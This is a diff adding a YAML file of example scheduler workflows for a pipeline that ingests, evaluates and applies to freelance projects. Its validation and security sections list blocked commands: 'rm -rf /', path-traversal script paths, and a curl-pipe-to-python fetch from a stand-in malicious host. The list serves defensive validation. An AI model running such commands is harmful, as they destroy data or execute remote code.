@@ -1,0 +1,777 @@
+# Harmonized Scheduler Workflow Examples
+# 
+# This file provides comprehensive examples of how to configure CLI command sequence workflows
+# for the enhanced scheduler system.
+
+# Basic Workflow Examples
+basic_workflows:
+
+  email_ingestion:
+    name: "Email Ingestion"
+    description: "Fetch new projects from email notifications"
+    workflow_type: "cli_sequence"
+    cli_commands:
+      - command: "python main.py --email-ingest --provider freelancermap"
+        name: "FreelancerMap Email"
+        description: "Process emails from freelancermap provider"
+        timeout: 600
+        continue_on_error: false
+    metadata:
+      dashboard_button: true
+      icon: "📧"
+      priority: "high"
+      category: "ingestion"
+    cron_schedule: "0 9-17 * * 1-5"  # Every hour 9-17, weekdays
+    timezone: "Europe/Berlin"
+
+  rss_ingestion:
+    name: "RSS Feed Processing"
+    description: "Fetch new projects from RSS feeds"
+    workflow_type: "cli_sequence"
+    cli_commands:
+      - command: "python main.py --rss-ingest --provider freelancermap"
+        name: "RSS Ingestion"
+        description: "Process RSS feeds from freelancermap"
+        timeout: 300
+        continue_on_error: false
+    metadata:
+      dashboard_button: true
+      icon: "📰"
+      priority: "high"
+      category: "ingestion"
+    cron_schedule: "0 9,12,15,18 * * 1-5"  # 4 times daily, weekdays
+    timezone: "Europe/Berlin"
+
+  evaluation_only:
+    name: "Project Evaluation"
+    description: "Evaluate scraped projects without ingestion"
+    workflow_type: "cli_sequence"
+    cli_commands:
+      - command: "python evaluate_projects.py"
+        name: "Full Evaluation"
+        description: "Run complete project evaluation with LLM analysis"
+        timeout: 1200
+        continue_on_error: false
+    metadata:
+      dashboard_button: true
+      icon: "📊"
+      priority: "normal"
+      category: "evaluation"
+    cron_schedule: "0 10 * * 1-5"  # Daily at 10 AM, weekdays
+    timezone: "Europe/Berlin"
+
+  application_generation:
+    name: "Generate Applications"
+    description: "Generate applications for accepted projects"
+    workflow_type: "cli_sequence"
+    cli_commands:
+      - command: "python main.py --generate-applications --threshold 85"
+        name: "Application Generation"
+        description: "Generate applications for projects with 85%+ score"
+        timeout: 900
+        continue_on_error: false
+    metadata:
+      dashboard_button: true
+      icon: "📝"
+      priority: "normal"
+      category: "generation"
+    cron_schedule: "0 11 * * 1-5"  # Daily at 11 AM, weekdays
+    timezone: "Europe/Berlin"
+
+# Advanced Multi-Step Workflows
+advanced_workflows:
+
+  complete_pipeline:
+    name: "Complete Processing Pipeline"
+    description: "Full workflow with multi-provider ingestion, evaluation, and application generation"
+    workflow_type: "cli_sequence"
+    cli_commands:
+      - command: "python main.py --email-ingest --provider all"
+        name: "Multi-Provider Email"
+        description: "Ingest from all configured email providers"
+        timeout: 600
+        continue_on_error: true  # Continue even if some providers fail
+      - command: "python main.py --rss-ingest --provider all"
+        name: "Multi-Provider RSS"
+        description: "Ingest from all configured RSS providers"
+        timeout: 300
+        continue_on_error: true
+      - command: "python evaluate_projects.py"
+        name: "Project Evaluation"
+        description: "Evaluate all newly scraped projects"
+        timeout: 1200
+        continue_on_error: false  # Stop if evaluation fails
+      - command: "python main.py --generate-applications --threshold 85"
+        name: "Generate Applications"
+        description: "Generate applications for high-scoring projects"
+        timeout: 900
+        continue_on_error: true  # Continue to cleanup even if generation fails
+      - command: "python file_purger.py"
+        name: "Cleanup Files"
+        description: "Remove old rejected projects and temporary files"
+        timeout: 180
+        continue_on_error: true
+    metadata:
+      dashboard_button: true
+      icon: "🚀"
+      priority: "high"
+      category: "complete"
+    cron_schedule: "0 8-18 * * 1-5"  # Every hour 8-18, weekdays
+    timezone: "Europe/Berlin"
+
+  weekend_maintenance:
+    name: "Weekend Maintenance"
+    description: "Comprehensive maintenance and cleanup workflow for weekends"
+    workflow_type: "cli_sequence"
+    cli_commands:
+      - command: "python main.py --rss-ingest --provider all"
+        name: "Weekend RSS Scan"
+        description: "Check for weekend project postings"
+        timeout: 300
+        continue_on_error: true
+      - command: "python evaluate_projects.py --force-evaluation"
+        name: "Re-evaluate Projects"
+        description: "Re-evaluate projects with updated criteria"
+        timeout: 1800
+        continue_on_error: true
+      - command: "python file_purger.py --categories logs temp_files rejected_low_pre_eval"
+        name: "Deep Cleanup"
+        description: "Aggressive cleanup of old files"
+        timeout: 300
+        continue_on_error: true
+    metadata:
+      dashboard_button: false  # Not shown on dashboard
+      icon: "🧹"
+      priority: "low"
+      category: "maintenance"
+    cron_schedule: "0 9,15,21 * * 6,0"  # 3 times on weekends
+    timezone: "Europe/Berlin"
+
+  targeted_evaluation:
+    name: "Targeted Evaluation Workflow"
+    description: "Multi-stage evaluation with different thresholds and criteria"
+    workflow_type: "cli_sequence"
+    cli_commands:
+      - command: "python evaluate_projects.py --pre-eval-only"
+        name: "Pre-evaluation Filter"
+        description: "Quick keyword-based filtering"
+        timeout: 300
+        continue_on_error: false
+      - command: "python evaluate_projects.py --force-evaluation"
+        name: "Force Full Evaluation"
+        description: "Force LLM evaluation of all projects"
+        timeout: 1800
+        continue_on_error: false
+      - command: "python main.py --generate-applications --all-accepted"
+        name: "Generate All Applications"
+        description: "Generate applications for all accepted projects"
+        timeout: 1200
+        continue_on_error: true
+    metadata:
+      dashboard_button: true
+      icon: "🎯"
+      priority: "normal"
+      category: "evaluation"
+    cron_schedule: "0 14 * * 1-5"  # Daily at 2 PM, weekdays
+    timezone: "Europe/Berlin"
+
+# Provider-Specific Workflows
+provider_workflows:
+
+  freelancermap_focused:
+    name: "FreelancerMap Only"
+    description: "Process only FreelancerMap projects with strict evaluation"
+    workflow_type: "cli_sequence"
+    cli_commands:
+      - command: "python main.py --email-ingest --provider freelancermap"
+        name: "FreelancerMap Email"
+        description: "Email ingestion from FreelancerMap only"
+        timeout: 300
+        continue_on_error: false
+      - command: "python main.py --rss-ingest --provider freelancermap"
+        name: "FreelancerMap RSS"
+        description: "RSS ingestion from FreelancerMap only"
+        timeout: 300
+        continue_on_error: false
+      - command: "python evaluate_projects.py"
+        name: "Strict Evaluation"
+        description: "Evaluate with default strict criteria"
+        timeout: 900
+        continue_on_error: false
+      - command: "python main.py --generate-applications --threshold 90"
+        name: "High-Threshold Generation"
+        description: "Only generate applications for 90%+ scores"
+        timeout: 600
+        continue_on_error: false
+    metadata:
+      dashboard_button: true
+      icon: "🎯"
+      priority: "normal"
+      category: "focused"
+    cron_schedule: "0 8,16 * * 1-5"  # Twice daily, weekdays
+    timezone: "Europe/Berlin"
+
+  multi_provider_ingestion:
+    name: "Multi-Provider Ingestion"
+    description: "Comprehensive ingestion from all available providers"
+    workflow_type: "cli_sequence"
+    cli_commands:
+      - command: "python main.py --email-ingest --provider freelancermap"
+        name: "FreelancerMap Email"
+        description: "Ingest emails from FreelancerMap"
+        timeout: 300
+        continue_on_error: true
+      - command: "python main.py --email-ingest --provider solcom"
+        name: "Solcom Email"
+        description: "Ingest emails from Solcom"
+        timeout: 300
+        continue_on_error: true
+      - command: "python main.py --rss-ingest --provider freelancermap"
+        name: "FreelancerMap RSS"
+        description: "Ingest RSS from FreelancerMap"
+        timeout: 300
+        continue_on_error: true
+    metadata:
+      dashboard_button: true
+      icon: "🌐"
+      priority: "high"
+      category: "ingestion"
+    cron_schedule: "0 7,12,17 * * 1-5"  # 3 times daily, weekdays
+    timezone: "Europe/Berlin"
+
+# Development and Testing Workflows
+development_workflows:
+
+  dry_run_testing:
+    name: "Dry Run Test Workflow"
+    description: "Test workflow configuration without making changes"
+    workflow_type: "cli_sequence"
+    cli_commands:
+      - command: "python main.py --email-ingest --provider freelancermap --dry-run"
+        name: "Test Email Ingestion"
+        description: "Simulate email ingestion without saving projects"
+        timeout: 300
+        continue_on_error: false
+      - command: "python main.py --rss-ingest --provider freelancermap --dry-run"
+        name: "Test RSS Ingestion"
+        description: "Simulate RSS ingestion without saving projects"
+        timeout: 300
+        continue_on_error: false
+    metadata:
+      dashboard_button: true
+      icon: "🧪"
+      priority: "low"
+      category: "testing"
+    cron_schedule: "0 */6 * * *"  # Every 6 hours
+    timezone: "Europe/Berlin"
+
+  state_reporting:
+    name: "Project State Report"
+    description: "Generate comprehensive project state reports"
+    workflow_type: "cli_sequence"
+    cli_commands:
+      - command: "python main.py --state-report"
+        name: "Generate State Report"
+        description: "Create detailed project state breakdown"
+        timeout: 180
+        continue_on_error: false
+    metadata:
+      dashboard_button: false
+      icon: "📈"
+      priority: "low"
+      category: "reporting"
+    cron_schedule: "0 8 * * 1"  # Weekly on Monday morning
+    timezone: "Europe/Berlin"
+
+# Specialized Workflows
+specialized_workflows:
+
+  high_value_projects:
+    name: "High-Value Project Focus"
+    description: "Focus on high-scoring projects with immediate application generation"
+    workflow_type: "cli_sequence"
+    cli_commands:
+      - command: "python main.py --rss-ingest --provider all"
+        name: "Quick RSS Scan"
+        description: "Fast RSS ingestion from all providers"
+        timeout: 300
+        continue_on_error: true
+      - command: "python evaluate_projects.py"
+        name: "Immediate Evaluation"
+        description: "Evaluate projects immediately"
+        timeout: 900
+        continue_on_error: false
+      - command: "python main.py --generate-applications --threshold 95"
+        name: "Elite Generation"
+        description: "Generate applications only for 95%+ projects"
+        timeout: 600
+        continue_on_error: false
+    metadata:
+      dashboard_button: true
+      icon: "💎"
+      priority: "high"
+      category: "premium"
+    cron_schedule: "0 9,13 * * 1-5"  # Twice daily, weekdays
+    timezone: "Europe/Berlin"
+
+  emergency_cleanup:
+    name: "Emergency Cleanup"
+    description: "Aggressive cleanup when storage is running low"
+    workflow_type: "cli_sequence"
+    cli_commands:
+      - command: "python file_purger.py --categories logs temp_files rejected_low_pre_eval rejected_low_llm"
+        name: "Aggressive Purge"
+        description: "Remove logs, temp files, and low-scoring rejected projects"
+        timeout: 300
+        continue_on_error: true
+      - command: "python main.py --state-list"
+        name: "State Summary"
+        description: "Show remaining project counts by state"
+        timeout: 60
+        continue_on_error: true
+    metadata:
+      dashboard_button: false
+      icon: "🗑️"
+      priority: "low"
+      category: "cleanup"
+    cron_schedule: "0 2 * * 0"  # Weekly Sunday 2 AM
+    timezone: "Europe/Berlin"
+
+# Example Parameter Combinations
+parameter_examples:
+
+  provider_specific:
+    description: "Commands that target specific providers"
+    valid_commands:
+      - "python main.py --email-ingest --provider freelancermap"
+      - "python main.py --rss-ingest --provider solcom"
+      - "python main.py --full-workflow --provider all"
+
+  evaluation_variants:
+    description: "Different evaluation approaches"
+    valid_commands:
+      - "python evaluate_projects.py"  # Full evaluation
+      - "python evaluate_projects.py --pre-eval-only"  # Pre-evaluation only
+      - "python evaluate_projects.py --force-evaluation"  # Force re-evaluation
+
+  application_generation:
+    description: "Application generation with different thresholds"
+    valid_commands:
+      - "python main.py --generate-applications"  # Use config threshold
+      - "python main.py --generate-applications --threshold 85"  # Custom threshold
+      - "python main.py --generate-applications --all-accepted"  # All accepted projects
+
+  file_management:
+    description: "File management and cleanup commands"
+    valid_commands:
+      - "python file_purger.py"  # Standard cleanup
+      - "python file_purger.py --dry-run"  # Test mode
+      - "python file_purger.py --categories logs temp_files"  # Specific categories
+
+  output_control:
+    description: "Commands with custom output directories"
+    valid_commands:
+      - "python main.py --email-ingest --provider freelancermap -o custom_output"
+      - "python main.py --rss-ingest --provider all --output-dir projects_test"
+
+# Validation Examples
+validation_examples:
+
+  valid_commands:
+    description: "Examples of valid CLI commands"
+    commands:
+      - command: "python main.py --email-ingest --provider freelancermap"
+        validation_result: "✅ Valid: Script exists, provider configured"
+      - command: "python evaluate_projects.py --pre-eval-only"
+        validation_result: "✅ Valid: Script exists, parameter supported"
+      - command: "python main.py --rss-ingest --provider all"
+        validation_result: "✅ Valid: Script exists, 'all' is valid provider value"
+
+  invalid_commands:
+    description: "Examples of invalid CLI commands that will be rejected"
+    commands:
+      - command: "python nonexistent_script.py"
+        validation_result: "❌ Invalid: Script not found"
+      - command: "python main.py --email-ingest --provider disabled_provider"
+        validation_result: "❌ Invalid: Provider disabled in configuration"
+      - command: "rm -rf /"
+        validation_result: "❌ Invalid: Commands must start with 'python'"
+      - command: "python ../malicious_script.py"
+        validation_result: "❌ Invalid: Path traversal blocked"
+      - command: "python main.py --invalid-flag"
+        validation_result: "⚠️ Warning: Unknown parameter for main.py"
+
+  provider_validation:
+    description: "Provider validation examples"
+    scenarios:
+      enabled_provider:
+        command: "python main.py --email-ingest --provider freelancermap"
+        config_requirement: "providers.freelancermap.enabled = true"
+        validation_result: "✅ Valid"
+      
+      disabled_provider:
+        command: "python main.py --email-ingest --provider disabled_provider"
+        config_requirement: "providers.disabled_provider.enabled = false"
+        validation_result: "❌ Invalid: Provider is disabled"
+      
+      missing_provider:
+        command: "python main.py --email-ingest --provider nonexistent"
+        config_requirement: "Provider not in config.providers"
+        validation_result: "❌ Invalid: Provider not found in configuration"
+
+  cron_validation:
+    description: "Cron schedule validation examples"
+    valid_schedules:
+      - "0 9-17 * * 1-5"  # Hourly 9-17, weekdays
+      - "0 9,12,15,18 * * *"  # 4 times daily
+      - "0 8 * * 1"  # Weekly Monday 8 AM
+      - "*/15 * * * *"  # Every 15 minutes
+    
+    invalid_schedules:
+      - "invalid cron"  # Not proper cron syntax
+      - "0 9-17 * *"  # Missing field (only 4 fields)
+      - "60 9 * * *"  # Invalid minute (must be 0-59)
+
+# Common Use Cases
+use_cases:
+
+  rapid_response:
+    name: "Rapid Response to New Projects"
+    description: "Quickly process and evaluate new high-value projects"
+    workflow_type: "cli_sequence"
+    cli_commands:
+      - command: "python main.py --rss-ingest --provider freelancermap"
+        name: "Quick RSS Check"
+        timeout: 180
+      - command: "python evaluate_projects.py --pre-eval-only"
+        name: "Fast Pre-screening"
+        timeout: 300
+      - command: "python main.py --generate-applications --threshold 95"
+        name: "Elite Applications"
+        timeout: 600
+    metadata:
+      dashboard_button: true
+      icon: "⚡"
+      priority: "high"
+    cron_schedule: "*/30 9-17 * * 1-5"  # Every 30 minutes during business hours
+
+  quality_control:
+    name: "Quality Control Review"
+    description: "Deep evaluation and quality assessment"
+    workflow_type: "cli_sequence"
+    cli_commands:
+      - command: "python evaluate_projects.py --force-evaluation"
+        name: "Force Re-evaluation"
+        description: "Re-evaluate all projects with current criteria"
+        timeout: 2400  # 40 minutes for thorough evaluation
+        continue_on_error: false
+      - command: "python main.py --state-report"
+        name: "Generate Report"
+        description: "Create detailed state report"
+        timeout: 120
+        continue_on_error: true
+    metadata:
+      dashboard_button: true
+      icon: "🔍"
+      priority: "normal"
+      category: "quality"
+    cron_schedule: "0 19 * * 5"  # Friday evening review
+
+  maintenance_mode:
+    name: "System Maintenance"
+    description: "Comprehensive system maintenance and optimization"
+    workflow_type: "cli_sequence"
+    cli_commands:
+      - command: "python file_purger.py --categories logs temp_files backups"
+        name: "Clean System Files"
+        description: "Remove old logs, temp files, and backups"
+        timeout: 300
+        continue_on_error: true
+      - command: "python main.py --state-list"
+        name: "Project Status Check"
+        description: "Review project state distribution"
+        timeout: 60
+        continue_on_error: true
+    metadata:
+      dashboard_button: false
+      icon: "⚙️"
+      priority: "low"
+      category: "system"
+    cron_schedule: "0 3 * * 0"  # Weekly Sunday 3 AM
+
+# Error Handling Examples
+error_handling:
+
+  resilient_pipeline:
+    name: "Resilient Processing Pipeline"
+    description: "Workflow designed to handle provider failures gracefully"
+    workflow_type: "cli_sequence"
+    cli_commands:
+      - command: "python main.py --email-ingest --provider freelancermap"
+        name: "Primary Email Source"
+        description: "Main email provider (critical)"
+        timeout: 600
+        continue_on_error: false  # Stop if primary fails
+      - command: "python main.py --email-ingest --provider solcom"
+        name: "Secondary Email Source"
+        description: "Backup email provider (optional)"
+        timeout: 600
+        continue_on_error: true  # Continue if backup fails
+      - command: "python main.py --rss-ingest --provider all"
+        name: "RSS Fallback"
+        description: "RSS as fallback if email fails"
+        timeout: 300
+        continue_on_error: true
+      - command: "python evaluate_projects.py"
+        name: "Process Available Projects"
+        description: "Evaluate whatever projects were obtained"
+        timeout: 1200
+        continue_on_error: false
+
+  graceful_degradation:
+    name: "Graceful Degradation"
+    description: "Workflow that adapts to failures"
+    workflow_type: "cli_sequence"
+    cli_commands:
+      - command: "python main.py --full-workflow --provider all"
+        name: "Attempt Full Workflow"
+        description: "Try complete workflow first"
+        timeout: 1800
+        continue_on_error: true
+      - command: "python evaluate_projects.py --pre-eval-only"
+        name: "Fallback Evaluation"
+        description: "At least do pre-evaluation if full workflow fails"
+        timeout: 300
+        continue_on_error: true
+      - command: "python file_purger.py"
+        name: "Cleanup After Failure"
+        description: "Clean up any partial results"
+        timeout: 180
+        continue_on_error: true
+
+# Performance Optimization Examples
+performance_examples:
+
+  optimized_evaluation:
+    name: "Performance-Optimized Evaluation"
+    description: "Fast evaluation with optimized timeouts"
+    workflow_type: "cli_sequence"
+    cli_commands:
+      - command: "python evaluate_projects.py --pre-eval-only"
+        name: "Quick Filter"
+        description: "Fast keyword-based filtering"
+        timeout: 120  # Short timeout for quick operation
+        continue_on_error: false
+      - command: "python evaluate_projects.py"
+        name: "Targeted LLM Analysis"
+        description: "LLM analysis only for pre-approved projects"
+        timeout: 600  # Moderate timeout
+        continue_on_error: false
+    metadata:
+      dashboard_button: true
+      icon: "🚄"
+      priority: "normal"
+      category: "optimized"
+
+  batch_processing:
+    name: "Batch Processing Mode"
+    description: "Optimized for processing large numbers of projects"
+    workflow_type: "cli_sequence"
+    cli_commands:
+      - command: "python main.py --rss-ingest --provider all"
+        name: "Bulk RSS Ingestion"
+        description: "Ingest from all RSS sources"
+        timeout: 600
+        continue_on_error: true
+      - command: "python evaluate_projects.py"
+        name: "Batch Evaluation"
+        description: "Evaluate all projects in batch"
+        timeout: 3600  # Extended timeout for large batches
+        continue_on_error: false
+      - command: "python main.py --generate-applications --threshold 80"
+        name: "Bulk Application Generation"
+        description: "Generate applications with lower threshold"
+        timeout: 1800
+        continue_on_error: true
+
+# Security and Validation Examples
+security_examples:
+
+  security_notes:
+    description: "Security considerations for CLI commands"
+    restrictions:
+      - "All commands must start with 'python' or 'python3'"
+      - "Script paths cannot use path traversal (../) "
+      - "Only scripts in the working directory are allowed"
+      - "Provider names are validated against configuration"
+      - "Unknown parameters generate warnings but don't block execution"
+    
+  safe_commands:
+    - "python main.py --email-ingest --provider freelancermap"
+    - "python evaluate_projects.py --config config.yaml"
+    - "python file_purger.py --dry-run"
+  
+  blocked_commands:
+    - "rm -rf /"  # Not starting with python
+    - "python ../outside_script.py"  # Path traversal
+    - "python /absolute/path/script.py"  # Absolute path outside working dir
+    - "curl https://malicious.com/script.py | python"  # Command injection
+
+# Cron Schedule Examples
+cron_examples:
+
+  common_schedules:
+    hourly_business: "0 9-17 * * 1-5"  # Every hour, 9 AM to 5 PM, weekdays
+    twice_daily: "0 9,17 * * 1-5"  # 9 AM and 5 PM, weekdays
+    four_times_daily: "0 9,12,15,18 * * *"  # 9 AM, noon, 3 PM, 6 PM, daily
+    daily_morning: "0 8 * * 1-5"  # 8 AM daily, weekdays
+    daily_evening: "0 18 * * 1-5"  # 6 PM daily, weekdays
+    weekly_monday: "0 9 * * 1"  # Monday 9 AM
+    weekend_only: "0 10,15,20 * * 6,0"  # 3 times on weekends
+    
+  advanced_schedules:
+    every_15_minutes: "*/15 * * * *"  # Every 15 minutes
+    every_30_minutes_business: "*/30 9-17 * * 1-5"  # Every 30 min, business hours
+    monthly_first: "0 9 1 * *"  # First day of month, 9 AM
+    quarterly: "0 9 1 1,4,7,10 *"  # First day of quarters
+
+# Migration Examples
+migration_examples:
+
+  legacy_to_cli:
+    description: "How legacy workflows map to CLI sequences"
+    
+    email_ingest_legacy:
+      old_format:
+        workflow_type: "email_ingest"
+        parameters:
+          provider: "freelancermap"
+          output_dir: "projects"
+          dry_run: false
+      
+      new_format:
+        workflow_type: "cli_sequence"
+        cli_commands:
+          - command: "python main.py --email-ingest --provider freelancermap -o projects"
+            name: "Email Ingestion"
+            timeout: 600
+
+    full_workflow_legacy:
+      old_format:
+        workflow_type: "full_workflow"
+        parameters:
+          provider: "all"
+      
+      new_format:
+        workflow_type: "cli_sequence"
+        cli_commands:
+          - command: "python main.py --email-ingest --provider all"
+            name: "Email Ingestion"
+            timeout: 600
+            continue_on_error: true
+          - command: "python main.py --rss-ingest --provider all"
+            name: "RSS Ingestion"
+            timeout: 300
+            continue_on_error: true
+          - command: "python evaluate_projects.py"
+            name: "Project Evaluation"
+            timeout: 1200
+          - command: "python main.py --generate-applications"
+            name: "Generate Applications"
+            timeout: 900
+            continue_on_error: true
+
+# Best Practices
+best_practices:
+
+  naming_conventions:
+    - "Use descriptive names that clearly indicate the workflow purpose"
+    - "Include the main action and target (e.g., 'FreelancerMap RSS Ingestion')"
+    - "Use consistent naming patterns across related workflows"
+
+  timeout_guidelines:
+    - "Email/RSS ingestion: 300-600 seconds"
+    - "Project evaluation: 900-1800 seconds (depends on project count)"
+    - "Application generation: 600-1200 seconds"
+    - "File operations: 60-300 seconds"
+
+  error_handling:
+    - "Set continue_on_error: true for non-critical steps"
+    - "Set continue_on_error: false for steps that later steps depend on"
+    - "Place cleanup operations at the end with continue_on_error: true"
+
+  scheduling:
+    - "Use business hours (9-17) for resource-intensive operations"
+    - "Schedule heavy workflows during off-peak hours"
+    - "Avoid overlapping workflows that compete for resources"
+
+  dashboard_integration:
+    - "Only enable dashboard_button for frequently used workflows"
+    - "Use meaningful icons that represent the workflow function"
+    - "Set appropriate priorities to organize button order"
+    - "Group related workflows with consistent categories"
+
+# Troubleshooting Guide
+troubleshooting:
+
+  common_issues:
+    command_not_found:
+      error: "Script not found: script_name.py"
+      solution: "Ensure the script exists in the working directory"
+      
+    provider_disabled:
+      error: "Provider 'xyz' is disabled or misconfigured"
+      solution: "Check config.yaml, ensure provider is enabled and has channels configured"
+      
+    invalid_syntax:
+      error: "Invalid shell syntax"
+      solution: "Check command for proper quoting and escaping"
+      
+    timeout_expired:
+      error: "Command timed out after X seconds"
+      solution: "Increase timeout value or optimize the command"
+
+  debugging_steps:
+    1. "Validate individual commands first using the validation button"
+    2. "Check the execution history for detailed error messages"
+    3. "Verify provider status in the configuration"
+    4. "Test commands manually in the terminal first"
+    5. "Check log files for detailed error information"
+
+# Configuration Templates
+configuration_templates:
+
+  startup_company:
+    name: "Startup-Focused Workflow"
+    description: "Optimized for finding startup and tech company projects"
+    cli_commands:
+      - command: "python main.py --rss-ingest --provider freelancermap"
+        name: "Tech Project Scan"
+        timeout: 300
+      - command: "python evaluate_projects.py"
+        name: "Startup-Focused Evaluation"
+        timeout: 900
+    cron_schedule: "0 9,14 * * 1-5"
+    metadata:
+      dashboard_button: true
+      icon: "🚀"
+      priority: "high"
+
+  enterprise_consulting:
+    name: "Enterprise Consulting Focus"
+    description: "Target large enterprise consulting projects"
+    cli_commands:
+      - command: "python main.py --email-ingest --provider all"
+        name: "Enterprise Email Scan"
+        timeout: 600
+      - command: "python evaluate_projects.py"
+        name: "Enterprise Evaluation"
+        timeout: 1200
+      - command: "python main.py --generate-applications --threshold 90"
+        name: "Premium Applications"
+        timeout: 900
+    cron_schedule: "0 8,16 * * 1-5"
+    metadata:
+      dashboard_button: true
+      icon: "🏢"
+      priority: "high"
